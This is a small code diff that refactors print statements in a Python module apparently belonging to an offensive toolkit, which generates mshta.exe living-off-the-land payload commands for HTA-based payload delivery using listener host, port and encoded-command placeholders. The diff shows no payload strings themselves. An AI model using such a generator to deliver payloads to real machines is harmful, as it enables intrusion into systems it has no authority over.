@@ -1,5 +1,4 @@
 """mshta.exe LOLBin — HTA execution for payload delivery."""
-from __future__ import annotations
 import sys
 from typing import Any
 
@@ -34,7 +33,7 @@ def run(args: Any) -> int:
     cmd = payloads.get(payload_type, payloads["hta_url"])
     cmd = cmd.format(lhost=lhost or "<LHOST>", lport=lport, b64_cmd="<B64_ENCODED>")
 
-    print("[*] mshta.exe LOLBin ({}):".format(payload_type))
-    print("  {}".format(cmd))
+    print(f"[*] mshta.exe LOLBin ({payload_type}):")
+    print(f"  {cmd}")
     print("\n[*] Available payloads: {}".format(", ".join(payloads.keys())))
     return 0
